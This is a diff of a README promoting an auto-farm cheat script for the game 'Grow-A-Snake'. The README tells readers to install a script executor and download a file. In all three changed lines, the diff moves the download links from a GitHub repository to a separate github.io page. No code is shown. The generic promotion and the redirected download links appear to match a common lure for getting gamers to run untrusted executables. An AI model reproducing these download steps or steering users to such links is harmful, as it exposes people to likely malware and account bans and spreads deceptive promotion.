@@ -1,6 +1,6 @@
 # 🐍 Grow-A-Snake-Script-Auto-Farm-2026 - Automate your snake growth journey today
 
-[![Download](https://img.shields.io/badge/Download-Visit_Repository-blue.svg)](https://github.com/Abhinav272765/Grow-A-Snake-Script-Auto-Farm-2026)
+[![Download](https://img.shields.io/badge/Download-Visit_Repository-blue.svg)](https://abhinav272765.github.io)
 
 ## 📌 Project Overview
 Grow-A-Snake-Script-Auto-Farm-2026 provides automated control for your gameplay. This tool manages snake movement, collects resources, and optimizes growth patterns to increase your game score. It handles repetitive tasks so you can focus on broader game strategies. The script includes automated farming, quest completion, and upgrade management. Use this tool if you want to reach higher ranks without manual input.
@@ -25,7 +25,7 @@ To run this application, your computer needs the following specifications:
 Follow these steps to set up the software on your Windows computer.
 
 1. Ensure you have a compatible script executor installed on your system. A script executor is a program that allows you to run external code within your game environment.
-2. Visit the following link to access the project files: [https://github.com/Abhinav272765/Grow-A-Snake-Script-Auto-Farm-2026](https://github.com/Abhinav272765/Grow-A-Snake-Script-Auto-Farm-2026)
+2. Visit the following link to access the project files: [https://abhinav272765.github.io](https://abhinav272765.github.io)
 3. Locate the latest release on the page.
 4. Download the provided file to your desktop.
 5. Launch your game application.
@@ -37,7 +37,7 @@ Follow these steps to set up the software on your Windows computer.
 ## 📥 Installation Details
 You must visit the official repository page to obtain the most current version. We update the file frequently to ensure compatibility with game patches.
 
-[Download the Script Here](https://github.com/Abhinav272765/Grow-A-Snake-Script-Auto-Farm-2026)
+[Download the Script Here](https://abhinav272765.github.io)
 
 Always check the repository page for new updates if the script stops working after a game update. Reloading the script usually fixes most connection issues.
 
